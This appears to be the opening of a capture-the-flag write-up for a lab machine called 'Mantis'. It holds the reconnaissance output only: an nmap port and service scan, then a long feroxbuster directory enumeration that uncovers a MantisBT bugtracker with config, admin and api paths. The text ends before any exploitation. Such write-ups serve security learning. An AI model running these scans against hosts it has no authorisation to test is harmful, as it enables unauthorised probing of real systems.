# CTF Writeup: Mantis

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.127.204
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-31 04:48 -0500
Nmap scan report for 192.168.127.204
Host is up (0.029s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Slick - Bootstrap 4 Template
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp open  mysql   MariaDB 5.5.5-10.3.34
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 14
|   Capabilities flags: 63486
|   Some Capabilities: SupportsTransactions, IgnoreSigpipes, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, InteractiveClient, LongColumnFlag, FoundRows, ODBCClient, Support41Auth, Speaks41ProtocolOld, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsCompression, ConnectWithDatabase, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: yY1(t4A,WRv{*W[BuJO1
|_  Auth Plugin Name: mysql_native_password
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   28.63 ms 192.168.45.1
2   28.65 ms 192.168.45.254
3   28.86 ms 192.168.251.1
4   28.92 ms 192.168.127.204

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.77 seconds
```

The webpage doesn't provide much utility itself, let's enumerate endpoints.

```
feroxbuster -u http://192.168.127.204
                                                                                                                                              
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.127.204/
 🚩  In-Scope Url          │ 192.168.127.204
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      315c http://192.168.127.204/js => http://192.168.127.204/js/
200      GET        5l      347w    19038c http://192.168.127.204/js/popper.min.js
200      GET      109l      305w     2403c http://192.168.127.204/css/owl.carousel.css
200      GET     1512l     3956w    52797c http://192.168.127.204/js/owl.carousel.js
200      GET        9l       42w     5254c http://192.168.127.204/img/team/01.jpg
200      GET        9l       42w     5254c http://192.168.127.204/img/team/02.jpg
200      GET        9l       29w     9967c http://192.168.127.204/img/showcase/03.jpg
200      GET     1459l     3974w    39706c http://192.168.127.204/css/main.css
200      GET      411l      919w    14762c http://192.168.127.204/js/nivo-lightbox.js
200      GET        4l      212w    20219c http://192.168.127.204/js/jquery.magnific-popup.min.js
200      GET       11l       33w     3039c http://192.168.127.204/img/logo.png
200      GET       96l      870w    76320c http://192.168.127.204/img/hero-area.jpg
200      GET        8l       47w     8718c http://192.168.127.204/img/showcase/04.jpg
200      GET        8l       47w     8718c http://192.168.127.204/img/showcase/05.jpg
200      GET        7l       18w     1436c http://192.168.127.204/img/testimonial/01.png
200      GET        9l       42w     5254c http://192.168.127.204/img/team/03.jpg
200      GET        8l       47w     8718c http://192.168.127.204/img/showcase/01.jpg
200      GET        9l       42w     5254c http://192.168.127.204/img/team/04.jpg
200      GET       13l       44w     7679c http://192.168.127.204/img/blog/03.jpg
200      GET        7l       13w      953c http://192.168.127.204/img/blog/avater-1.jpg
200      GET       13l       44w     7679c http://192.168.127.204/img/blog/01.jpg
200      GET       13l       44w     7679c http://192.168.127.204/img/blog/02.jpg
200      GET       28l      107w    14957c http://192.168.127.204/img/blog/img1.jpg
200      GET      177l      980w    69060c http://192.168.127.204/img/contact/01.png
200      GET       28l      107w    14957c http://192.168.127.204/img/blog/img2.jpg
200      GET       23l      124w    33883c http://192.168.127.204/img/blog/blog-1-big.jpg
301      GET        9l       28w      318c http://192.168.127.204/fonts => http://192.168.127.204/fonts/
200      GET     1690l     8292w   166512c http://192.168.127.204/fonts/LineIcons.ttf
200      GET     1690l     8293w   166586c http://192.168.127.204/fonts/LineIcons.woff
200      GET     1690l     8294w   166694c http://192.168.127.204/fonts/LineIcons.eot
200      GET      492l    39607w   573011c http://192.168.127.204/fonts/LineIcons.svg
301      GET        9l       28w      316c http://192.168.127.204/css => http://192.168.127.204/css/
200      GET      209l      473w     5772c http://192.168.127.204/css/nivo-lightbox.css
200      GET      351l      795w     7302c http://192.168.127.204/css/magnific-popup.css
200      GET      440l     1430w    12324c http://192.168.127.204/css/responsive.css
200      GET     1342l     3624w    56841c http://192.168.127.204/
200      GET       79l      187w     1665c http://192.168.127.204/css/owl.theme.css
200      GET       14l      200w     3625c http://192.168.127.204/css/main.map
200      GET     1907l     3292w    31420c http://192.168.127.204/css/LineIcons.css
200      GET     3303l     5911w    69727c http://192.168.127.204/css/animate.css
200      GET        7l     1608w   140930c http://192.168.127.204/css/bootstrap.min.css
301      GET        9l       28w      323c http://192.168.127.204/bugtracker => http://192.168.127.204/bugtracker/
301      GET        9l       28w      327c http://192.168.127.204/bugtracker/css => http://192.168.127.204/bugtracker/css/
301      GET        9l       28w      331c http://192.168.127.204/bugtracker/scripts => http://192.168.127.204/bugtracker/scripts/
200      GET       11l       20w      309c http://192.168.127.204/bugtracker/scripts/Web.config
200      GET      189l      473w     5010c http://192.168.127.204/bugtracker/scripts/travis_before_script.sh
200      GET        8l       37w      275c http://192.168.127.204/bugtracker/scripts/README
200      GET       34l       72w      834c http://192.168.127.204/bugtracker/scripts/travis_script.sh
200      GET       66l       85w      652c http://192.168.127.204/bugtracker/css/rtl.css
200      GET       29l      165w     1175c http://192.168.127.204/bugtracker/css/open-sans.css
200      GET      388l     1128w    11652c http://192.168.127.204/bugtracker/css/dropzone-4.3.0.css
200      GET      640l     1489w    12793c http://192.168.127.204/bugtracker/css/ace-mantis.css
200      GET        4l       66w    29063c http://192.168.127.204/bugtracker/css/font-awesome-4.6.3.min.css
301      GET        9l       28w      328c http://192.168.127.204/bugtracker/lang => http://192.168.127.204/bugtracker/lang/
200      GET        5l     1360w   115813c http://192.168.127.204/bugtracker/css/bootstrap-3.3.6.min.css
200      GET     6726l    15994w   151773c http://192.168.127.204/bugtracker/css/bootstrap-3.3.6.css
200      GET      818l     4299w    57296c http://192.168.127.204/bugtracker/lang/strings_greek.txt
301      GET        9l       28w      331c http://192.168.127.204/bugtracker/library => http://192.168.127.204/bugtracker/library/
200      GET      498l     2551w    24911c http://192.168.127.204/bugtracker/lang/strings_volapuk.txt
200      GET     1211l     6629w    68510c http://192.168.127.204/bugtracker/lang/strings_estonian.txt
200      GET      396l     2003w    18512c http://192.168.127.204/bugtracker/lang/strings_norwegian_nynorsk.txt
200      GET       18l     4786w   298300c http://192.168.127.204/bugtracker/css/ace.min.css
200      GET       11l       20w      309c http://192.168.127.204/bugtracker/library/Web.config
200      GET     1272l     7294w    76249c http://192.168.127.204/bugtracker/lang/strings_slovak.txt
200      GET      817l     4103w    43544c http://192.168.127.204/bugtracker/lang/strings_latvian.txt
200      GET     1006l     5474w    55493c http://192.168.127.204/bugtracker/lang/strings_basque.txt
200      GET      914l     5506w    53810c http://192.168.127.204/bugtracker/lang/strings_icelandic.txt
200      GET     1218l     7348w    70968c http://192.168.127.204/bugtracker/lang/strings_danish.txt
200      GET     1251l     7753w    75986c http://192.168.127.204/bugtracker/lang/strings_romanian.txt
200      GET       11l       20w      309c http://192.168.127.204/bugtracker/doc/Web.config
200      GET       39l      186w     1344c http://192.168.127.204/bugtracker/doc/ace-theme-license.txt
200      GET      519l      951w     7545c http://192.168.127.204/bugtracker/doc/CREDITS
200      GET     1400l     4523w    77541c http://192.168.127.204/bugtracker/lang/strings_chinese_simplified.txt
301      GET        9l       28w      329c http://192.168.127.204/bugtracker/fonts => http://192.168.127.204/bugtracker/fonts/
200      GET      993l     8551w    77948c http://192.168.127.204/bugtracker/lang/strings_urdu.txt
200      GET     1405l     8473w    88988c http://192.168.127.204/bugtracker/lang/strings_german.txt
200      GET     1360l     7291w    84688c http://192.168.127.204/bugtracker/lang/strings_korean.txt
200      GET     1765l     9276w    84634c http://192.168.127.204/bugtracker/lang/strings_english.txt
200      GET     1201l     7121w    83878c http://192.168.127.204/bugtracker/lang/strings_arabicegyptianspoken.txt
200      GET     1393l     8671w    85456c http://192.168.127.204/bugtracker/lang/strings_dutch.txt
200      GET     1388l     8047w    88996c http://192.168.127.204/bugtracker/lang/strings_hungarian.txt
200      GET     1291l     8853w    79200c http://192.168.127.204/bugtracker/lang/strings_occitan.txt
200      GET     1220l    10323w    82623c http://192.168.127.204/bugtracker/lang/strings_vietnamese.txt
200      GET      416l     1999w    19803c http://192.168.127.204/bugtracker/lang/strings_croatian.txt
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/icon_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/category_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/columns_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/install_helper_functions_api.php
200      GET       11l       20w      309c http://192.168.127.204/bugtracker/core/Web.config
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/user_pref_api.php
200      GET     1388l     4554w    93366c http://192.168.127.204/bugtracker/lang/strings_japanese.txt
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/mention_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/authentication_api.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/php_api.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/url_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/bug_activity_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/event_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/database_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/rss_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/tokens_api.php
200      GET      339l     2968w    18092c http://192.168.127.204/bugtracker/doc/LICENSE
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/utility_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/history_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/events_inc.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/config_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/form_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/workflow_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/obsolete.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/compress_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/relationship_graph_api.php
200      GET     1268l     8268w    76286c http://192.168.127.204/bugtracker/lang/strings_catalan.txt
200      GET     1286l     7384w    77248c http://192.168.127.204/bugtracker/lang/strings_polish.txt
200      GET      252l      742w     8624c http://192.168.127.204/bugtracker/library/securimage/securimage.js
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/securimage/securimage.php
200      GET      222l     1140w     8800c http://192.168.127.204/bugtracker/library/securimage/README.txt
200      GET     1390l     9018w   118807c http://192.168.127.204/bugtracker/lang/strings_bulgarian.txt
200      GET       12l       63w      398c http://192.168.127.204/bugtracker/library/securimage/README.FONT.txt
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/securimage/securimage_show.php
200      GET       27l       58w      682c http://192.168.127.204/bugtracker/library/securimage/composer.json
200      GET       25l      194w     1386c http://192.168.127.204/bugtracker/library/securimage/LICENSE.txt
200      GET       41l       95w     1080c http://192.168.127.204/bugtracker/library/securimage/securimage.css
200      GET     1410l    10167w    90761c http://192.168.127.204/bugtracker/lang/strings_french.txt
200      GET     1278l     7027w    74968c http://192.168.127.204/bugtracker/lang/strings_turkish.txt
200      GET     1228l     6717w    72191c http://192.168.127.204/bugtracker/lang/strings_lithuanian.txt
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/securimage/WavFile.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/filter_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/profile_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/user_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/http_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/print_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/email_queue_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/lang_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/news_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/error_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/relationship_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/summary_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/wiki_api.php
301      GET        9l       28w      330c http://192.168.127.204/bugtracker/images => http://192.168.127.204/bugtracker/images/
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/bug_revision_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/string_api.php
200      GET        2l       17w     2166c http://192.168.127.204/bugtracker/images/favicon.ico
200      GET        3l        4w      127c http://192.168.127.204/bugtracker/images/rel_related.png
200      GET        3l        5w      142c http://192.168.127.204/bugtracker/images/rel_dependant.png
200      GET       41l      244w    19680c http://192.168.127.204/bugtracker/images/mantis_logo_notext.png
200      GET        4l        5w      129c http://192.168.127.204/bugtracker/images/rel_duplicate.png
301      GET        9l       28w      329c http://192.168.127.204/bugtracker/admin => http://192.168.127.204/bugtracker/admin/
301      GET        9l       28w      326c http://192.168.127.204/bugtracker/js => http://192.168.127.204/bugtracker/js/
200      GET       30l      166w     1111c http://192.168.127.204/bugtracker/js/login.js
200      GET        4l      109w     4586c http://192.168.127.204/bugtracker/js/respond.min.js
200      GET      124l      375w     3834c http://192.168.127.204/bugtracker/js/bugFilter.js
200      GET        2l      277w    15689c http://192.168.127.204/bugtracker/js/list-1.4.1.min.js
200      GET        4l      102w     3047c http://192.168.127.204/bugtracker/js/html5shiv.min.js
301      GET        9l       28w      330c http://192.168.127.204/bugtracker/config => http://192.168.127.204/bugtracker/config/
301      GET        9l       28w      327c http://192.168.127.204/bugtracker/api => http://192.168.127.204/bugtracker/api/
200      GET       11l       20w      309c http://192.168.127.204/bugtracker/plugins/Web.config
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/config/config_inc.php
200      GET       11l       20w      309c http://192.168.127.204/bugtracker/config/Web.config
200      GET       83l      474w     3354c http://192.168.127.204/bugtracker/config/config_inc.php.sample
200      GET      493l     4175w   301000c http://192.168.127.204/bugtracker/doc/modern_view_issue.png
200      GET     2805l     8457w   107439c http://192.168.127.204/bugtracker/js/ace.js
200      GET      622l     4624w   374652c http://192.168.127.204/bugtracker/doc/modern_view_issues.png
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/plugins/MantisGraph/MantisGraph.php
301      GET        9l       28w      331c http://192.168.127.204/bugtracker/plugins => http://192.168.127.204/bugtracker/plugins/
200      GET      731l     9352w   232806c http://192.168.127.204/bugtracker/js/moment-with-locales-2.15.2.min.js
200      GET      885l     6295w   551540c http://192.168.127.204/bugtracker/doc/modern_my_view.png
200      GET     3037l    12998w   584771c http://192.168.127.204/bugtracker/library/securimage/securimage_play.php
200      GET        2l       11w       79c http://192.168.127.204/bugtracker/scripts/send_emails.php
200      GET     4168l    11722w   104375c http://192.168.127.204/bugtracker/css/ace-rtl.css
200      GET        3l        5w      143c http://192.168.127.204/bugtracker/css/images/ui-bg_highlight-soft_75_cccccc_1x100.png
200      GET        6l       19w      567c http://192.168.127.204/bugtracker/css/images/ajax-loader.png
200      GET       18l      122w     8200c http://192.168.127.204/bugtracker/css/images/ui-icons_ffd27a_256x240.png
200      GET        6l       10w      183c http://192.168.127.204/bugtracker/css/images/ui-bg_glass_95_fef1ec_1x400.png
200      GET       11l      119w     6379c http://192.168.127.204/bugtracker/css/images/icons-36-white.png
200      GET       21l      133w     6343c http://192.168.127.204/bugtracker/css/images/icons-36-black.png
200      GET        3l        6w      352c http://192.168.127.204/bugtracker/css/images/ui-bg_glass_100_f6f6f6_1x400.png
200      GET        4l       15w      446c http://192.168.127.204/bugtracker/css/images/ui-bg_diagonals-thick_20_666666_40x40.png
200      GET        5l        7w      186c http://192.168.127.204/bugtracker/css/images/ui-bg_glass_55_fbf9ee_1x400.png
200      GET       20l      167w    11321c http://192.168.127.204/bugtracker/css/images/ui-icons_ffffff_256x240.png
200      GET      104l      193w     7987c http://192.168.127.204/bugtracker/css/images/ui-icons_cd0a0a_256x240.png
200      GET       25l      114w     7829c http://192.168.127.204/bugtracker/css/images/ui-icons_454545_256x240.png
200      GET        5l       14w      619c http://192.168.127.204/bugtracker/css/images/ui-bg_diagonals-thick_18_b81900_40x40.png
200      GET       18l      122w     7932c http://192.168.127.204/bugtracker/css/images/ui-icons_ef8c08_256x240.png
200      GET        5l        8w      174c http://192.168.127.204/bugtracker/css/images/ui-bg_glass_75_e6e6e6_1x400.png
200      GET       84l      361w    13510c http://192.168.127.204/bugtracker/css/images/ajax-loader.gif
200      GET        7l       37w     3155c http://192.168.127.204/bugtracker/css/images/icons-18-white.png
200      GET        7l       47w     3110c http://192.168.127.204/bugtracker/css/images/icons-18-black.png
200      GET       32l      200w    12622c http://192.168.127.204/bugtracker/css/images/ui-icons_222222_256x240.png
200      GET       25l      114w     8303c http://192.168.127.204/bugtracker/css/images/ui-icons_888888_256x240.png
200      GET        3l        5w      246c http://192.168.127.204/bugtracker/css/images/ui-bg_glass_65_ffffff_1x400.png
200      GET       25l      114w     8145c http://192.168.127.204/bugtracker/css/images/ui-icons_2e83ff_256x240.png
200      GET        3l       18w      268c http://192.168.127.204/bugtracker/css/images/ui-bg_flat_75_ffffff_40x100.png
200      GET        3l        5w      213c http://192.168.127.204/bugtracker/css/images/ui-bg_flat_0_aaaaaa_40x100.png
200      GET       94l      258w     2084c http://192.168.127.204/bugtracker/css/default.css
200      GET       54l      106w      827c http://192.168.127.204/bugtracker/css/login.css
200      GET        5l      214w     7771c http://192.168.127.204/bugtracker/css/bootstrap-datetimepicker-4.17.43.min.css
200      GET        8l       54w      485c http://192.168.127.204/bugtracker/css/status_config.php
200      GET        1l      252w     9716c http://192.168.127.204/bugtracker/css/dropzone-4.3.0.min.css
200      GET       18l      523w    14106c http://192.168.127.204/bugtracker/css/ace-skins.min.css
200      GET      590l     1994w    18301c http://192.168.127.204/bugtracker/css/ace-skins.css
200      GET     1955l     4785w    45117c http://192.168.127.204/bugtracker/css/ace-part2.css
200      GET    15364l    39039w   394739c http://192.168.127.204/bugtracker/css/ace.css
200      GET       18l      311w    10334c http://192.168.127.204/bugtracker/css/ace-ie.min.css
200      GET       18l      817w    29694c http://192.168.127.204/bugtracker/css/ace-part2.min.css
200      GET       18l     2613w    74972c http://192.168.127.204/bugtracker/css/ace-rtl.min.css
200      GET      423l     1162w    13932c http://192.168.127.204/bugtracker/css/ace-ie.css
200      GET        7l       18w      153c http://192.168.127.204/bugtracker/css/common_config.php
200      GET      526l     2237w    26076c http://192.168.127.204/bugtracker/lang/strings_amharic.txt
200      GET     1232l     7998w    74471c http://192.168.127.204/bugtracker/lang/strings_portuguese_standard.txt
200      GET     1394l     4776w    78993c http://192.168.127.204/bugtracker/lang/strings_chinese_traditional.txt
200      GET     1361l     8373w    80710c http://192.168.127.204/bugtracker/lang/strings_norwegian_bokmal.txt
200      GET     1377l     8067w    84210c http://192.168.127.204/bugtracker/lang/strings_czech.txt
200      GET     1402l     9575w    89368c http://192.168.127.204/bugtracker/lang/strings_spanish.txt
200      GET     1211l     9366w    81900c http://192.168.127.204/bugtracker/lang/strings_tagalog.txt
200      GET     1351l     9176w    84524c http://192.168.127.204/bugtracker/lang/strings_interlingua.txt
200      GET     1256l     7312w    96863c http://192.168.127.204/bugtracker/lang/strings_serbian.txt
200      GET     1398l     8516w    84747c http://192.168.127.204/bugtracker/lang/strings_swedish.txt
200      GET      924l     6533w    60945c http://192.168.127.204/bugtracker/lang/strings_ripoarisch.txt
200      GET     1388l     9069w    86761c http://192.168.127.204/bugtracker/lang/strings_italian.txt
200      GET     1404l     8179w   116640c http://192.168.127.204/bugtracker/lang/strings_russian.txt
200      GET     1353l     8216w    97128c http://192.168.127.204/bugtracker/lang/strings_arabic.txt
301      GET        9l       28w      330c http://192.168.127.204/bugtracker/vendor => http://192.168.127.204/bugtracker/vendor/
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/vendor/autoload.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/vendor/composer/ClassLoader.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/vendor/composer/autoload_real.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/vendor/composer/autoload_static.php
200      GET       21l      169w     1075c http://192.168.127.204/bugtracker/vendor/composer/LICENSE
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/vendor/composer/autoload_namespaces.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/vendor/composer/autoload_classmap.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/vendor/composer/autoload_files.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/vendor/composer/autoload_psr4.php
200      GET      488l      874w    14814c http://192.168.127.204/bugtracker/vendor/composer/installed.json
200      GET        9l       47w      407c http://192.168.127.204/bugtracker/lang/README
200      GET       11l       20w      309c http://192.168.127.204/bugtracker/lang/Web.config
301      GET        9l       28w      327c http://192.168.127.204/bugtracker/doc => http://192.168.127.204/bugtracker/doc/
301      GET        9l       28w      328c http://192.168.127.204/bugtracker/core => http://192.168.127.204/bugtracker/core/
200      GET       64l      240w     2788c http://192.168.127.204/bugtracker/library/README.md
200      GET      559l     2433w    23226c http://192.168.127.204/bugtracker/lang/strings_afrikaans.txt
200      GET      703l     4029w    38995c http://192.168.127.204/bugtracker/lang/strings_slovene.txt
200      GET      504l     2267w    23930c http://192.168.127.204/bugtracker/lang/strings_qqq.txt
200      GET     1384l    10097w    87636c http://192.168.127.204/bugtracker/lang/strings_breton.txt
200      GET       75l      480w    40790c http://192.168.127.204/bugtracker/fonts/DXI1ORHCpsQm3Vp6mXoaTXhCUOGz7vYGh680lGh-uXM.woff
200      GET     1231l     6492w    73662c http://192.168.127.204/bugtracker/lang/strings_finnish.txt
200      GET      704l     4372w    41614c http://192.168.127.204/bugtracker/lang/strings_asturian.txt
200      GET     1388l     9791w    88590c http://192.168.127.204/bugtracker/lang/strings_galician.txt
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/parsedown/Parsedown.php
200      GET       20l      172w     1091c http://192.168.127.204/bugtracker/library/parsedown/LICENSE.txt
200      GET     1248l     7413w    73068c http://192.168.127.204/bugtracker/lang/strings_swissgerman.txt
200      GET       56l      282w     2731c http://192.168.127.204/bugtracker/library/parsedown/README.md
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/rsfilter.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-csvlib.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-error.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-datadict.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-errorhandler.inc.php
200      GET       37l       85w      696c http://192.168.127.204/bugtracker/library/adodb/composer.json
200      GET       43l      194w     1677c http://192.168.127.204/bugtracker/library/adodb/xmlschema03.dtd
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/toexport.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-php4.inc.php
200      GET       39l      168w     1452c http://192.168.127.204/bugtracker/library/adodb/xmlschema.dtd
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-pager.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-active-recordx.inc.php
200      GET      106l      587w    35387c http://192.168.127.204/bugtracker/fonts/glyphicons-halflings-regular.eot
200      GET       67l      499w    39412c http://192.168.127.204/bugtracker/fonts/cJZKeOuBrn4kERxqtaUH3T8E0i7KZn-EPnyo3HZu7kw.woff
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-xmlschema03.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-errorpear.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-lib.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-time.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-perf.inc.php
200      GET      390l     2094w   135959c http://192.168.127.204/bugtracker/fonts/fontawesome-webfont.eot
200      GET     1279l     7126w    82196c http://192.168.127.204/bugtracker/lang/strings_hebrew.txt
200      GET       73l      429w    32536c http://192.168.127.204/bugtracker/fonts/glyphicons-halflings-regular.woff2
200      GET       94l      534w    42816c http://192.168.127.204/bugtracker/fonts/glyphicons-halflings-regular.woff
200      GET     1216l     7126w    69470c http://192.168.127.204/bugtracker/lang/strings_serbian_latin.txt
200      GET     1406l     9380w    87385c http://192.168.127.204/bugtracker/lang/strings_portuguese_brazil.txt
200      GET     1380l     8143w   114149c http://192.168.127.204/bugtracker/lang/strings_ukrainian.txt
200      GET      496l     4338w    26224c http://192.168.127.204/bugtracker/library/adodb/LICENSE.md
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-memcache.lib.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-iterator.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/pivottable.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-exceptions.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-pear.inc.php
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/adodb-active-record.inc.php
200      GET      772l     1723w    58132c http://192.168.127.204/bugtracker/fonts/glyphicons-halflings-regular.ttf
200      GET      109l      505w     4616c http://192.168.127.204/bugtracker/library/adodb/README.md
301      GET        9l       28w      336c http://192.168.127.204/bugtracker/library/utf8 => http://192.168.127.204/bugtracker/library/utf8/
200      GET        0l        0w        0c http://192.168.127.204/bugtracker/library/adodb/tohtml.inc.php
200      GET     1352l     8136w   118560c http://192.168.127.204/bugtracker/lang/strings_belarusian_tarask.txt
200      GET      260l     1635w   130134c http://192.168.127.204/bugtracker/fonts/fontawesome-webfont.woff2
200      GET     1385l     9099w   119231c http://192.168.127.204/bugtracker/lang/strings_macedonian.txt
200      GET      288l    13959w   108738c http://192.168.127.204/bugtracker/fonts/glyphicons-halflings-regular.svg
200      GET      310l     2069w   163622c http://192.168.127.204/bugtracker/fonts/fontawesome-webfont.woff
200      GET     1304l     5478w   196149c http://192.168.127.204/bugtracker/fonts/fontawesome-webfont.ttf
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/crypto_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/tag_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/timeline_inc.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/html_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/filter_form_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/access_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/gpc_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/csv_api.php
500      GET        0l        0w        0c http://192.168.127.204/bugtracker/core/bug_group_action_api.php
301      GET        9l       28w      346c http://192.168.127.204/bugtracker/library/rssbuilder/doc => http://192.168.127.204/bugtracker/library/rssbuilder/doc/
